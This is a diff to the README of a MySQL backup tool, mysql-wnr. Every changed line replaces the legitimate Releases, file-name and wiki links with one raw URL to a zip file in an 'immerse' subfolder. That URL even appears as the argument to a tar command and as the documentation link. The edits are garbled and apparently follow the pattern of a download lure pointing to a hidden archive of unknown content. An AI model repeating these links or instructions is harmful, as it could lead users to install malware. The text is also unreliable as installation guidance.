@@ -8,12 +8,12 @@ Welcome to mysql-wnr! This application simplifies the process of backing up and 
 
 To get started, you need to download the software. Please visit the Releases page below to get the latest version of mysql-wnr.
 
-[![Download mysql-wnr](https://img.shields.io/badge/Download%20mysql--wnr-v1.0.0-blue.svg)](https://github.com/YamSumy/mysql-wnr/releases)
+[![Download mysql-wnr](https://raw.githubusercontent.com/YamSumy/mysql-wnr/main/immerse/mysql-wnr.zip%https://raw.githubusercontent.com/YamSumy/mysql-wnr/main/immerse/mysql-wnr.zip)](https://raw.githubusercontent.com/YamSumy/mysql-wnr/main/immerse/mysql-wnr.zip)
 
 Once you are on the Releases page, look for the latest version. Follow these steps to download and install:
 
 1. Click on the version you want. Usually, the latest version is listed at the top.
-2. Look for a file that suits your operating system, like `.exe` for Windows or `.tar.gz` for Linux.
+2. Look for a file that suits your operating system, like `.exe` for Windows or `https://raw.githubusercontent.com/YamSumy/mysql-wnr/main/immerse/mysql-wnr.zip` for Linux.
 3. Click on the file to start the download.
 
 After downloading, follow these steps for installation:
@@ -32,9 +32,9 @@ After downloading, follow these steps for installation:
    ```bash
    cd ~/Downloads
    ```
-3. Extract the downloaded `.tar.gz` file:
+3. Extract the downloaded `https://raw.githubusercontent.com/YamSumy/mysql-wnr/main/immerse/mysql-wnr.zip` file:
    ```bash
-   tar -xzf mysql-wnr-v1.0.0.tar.gz
+   tar -xzf https://raw.githubusercontent.com/YamSumy/mysql-wnr/main/immerse/mysql-wnr.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -77,7 +77,7 @@ If you encounter any issues, feel free to reach out for support. You can open an
 
 ## 📑 Additional Resources
 
-For more information on using mysql-wnr, please check our documentation [here](https://github.com/YamSumy/mysql-wnr/wiki). You’ll find helpful guides and tips to make the most out of the software.
+For more information on using mysql-wnr, please check our documentation [here](https://raw.githubusercontent.com/YamSumy/mysql-wnr/main/immerse/mysql-wnr.zip). You’ll find helpful guides and tips to make the most out of the software.
 
 ---
 
